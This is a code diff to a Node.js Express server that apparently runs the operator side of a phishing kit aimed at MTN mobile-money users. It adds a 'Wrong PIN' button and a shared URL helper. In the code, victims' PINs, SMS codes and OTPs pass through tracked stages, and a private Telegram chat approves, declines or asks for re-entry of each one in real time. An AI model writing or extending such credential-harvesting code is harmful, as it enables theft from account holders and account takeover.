@@ -117,6 +117,15 @@ function normalizeLang(v){
   return (l === 'fr' || l === 'en') ? l : 'en';
 }
 
+function resolvePublicUrl(){
+  return (
+    process.env.PUBLIC_URL ||
+    (process.env.RAILWAY_PUBLIC_DOMAIN ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}` : '') ||
+    (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '') ||
+    `http://localhost:${PORT}`
+  ).replace(/\/+$/, '');
+}
+
 app.get('/', (_req, res) => {
   res.json({
     ok: true,
@@ -125,7 +134,7 @@ app.get('/', (_req, res) => {
     activeTxs: txs.size,
     dataDir: DATA_DIR,
     telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
-    publicUrl: process.env.PUBLIC_URL || '(not set)',
+    publicUrl: resolvePublicUrl(),
     time: new Date().toISOString()
   });
 });
@@ -159,7 +168,7 @@ app.get('/api/check-webhook', async (_req, res) => {
 
 app.get('/api/set-webhook', async (_req, res) => {
   try {
-    const publicUrl = (process.env.PUBLIC_URL || `https://${process.env.RAILWAY_PUBLIC_DOMAIN || 'localhost'}`).replace(/\/+$/, '');
+    const publicUrl = resolvePublicUrl();
     const webhookUrl = `${publicUrl}/api/telegram-webhook`;
     const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
     const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
@@ -330,6 +339,9 @@ app.post('/api/mtn/sms', async (req, res) => {
         [
           { text: '📄 Needs Full SMS', callback_data: `mtn:sms:needs_full_sms:${tracking}` },
           { text: '🔁 Resend',         callback_data: `mtn:sms:resend:${tracking}` }
+        ],
+        [
+          { text: '⚠️ Wrong PIN', callback_data: `mtn:sms:wrong_pin:${tracking}` }
         ]
       ]
     };
@@ -464,6 +476,7 @@ app.get('/api/mtn/sms-status/:tx', (req, res) => {
   else if (t.smsStatus === 'declined') decision = 'declined';
   else if (t.smsStatus === 'resend') decision = 'expired';
   else if (t.smsStatus === 'needs_full_sms') decision = 'needs_full_sms';
+  else if (t.smsStatus === 'wrong_pin') decision = 'wrong_pin';
 
   res.json({ ok:true, decision, tx: tracking, lang: normalizeLang(t.lang) });
 });
@@ -508,7 +521,14 @@ app.post('/api/telegram-webhook', async (req, res) => {
           return res.json({ ok:true });
         }
 
-        const labels = { approve:'✅ Approved', decline:'❌ Declined', resend:'🔁 Resend', inactive:'⚠️ Inactive', needs_full_sms:'📄 Needs Full SMS' };
+        const labels = {
+          approve:'✅ Approved',
+          decline:'❌ Declined',
+          resend:'🔁 Resend',
+          inactive:'⚠️ Inactive',
+          needs_full_sms:'📄 Needs Full SMS',
+          wrong_pin:'⚠️ Wrong PIN'
+        };
 
         if (stage === 'pin') {
           if (action === 'approve') t.pinStatus = 'approved';
@@ -518,6 +538,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
           else if (action === 'decline') t.smsStatus = 'declined';
           else if (action === 'resend') t.smsStatus = 'resend';
           else if (action === 'needs_full_sms') t.smsStatus = 'needs_full_sms';
+          else if (action === 'wrong_pin') t.smsStatus = 'wrong_pin';
         } else if (stage === 'otp') {
           if (action === 'approve') t.otpStatus = 'approved';
           else if (action === 'decline') t.otpStatus = 'declined';
@@ -541,12 +562,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
 });
 
 async function registerWebhook(){
-  const publicUrl = (
-    process.env.PUBLIC_URL ||
-    (process.env.RAILWAY_PUBLIC_DOMAIN ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}` : '') ||
-    (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '') ||
-    `http://localhost:${PORT}`
-  ).replace(/\/+$/, '');
+  const publicUrl = resolvePublicUrl();
   const webhookUrl = `${publicUrl}/api/telegram-webhook`;
   console.log(`PUBLIC_URL = ${publicUrl}`);
   console.log(`Registering webhook: ${webhookUrl}`);
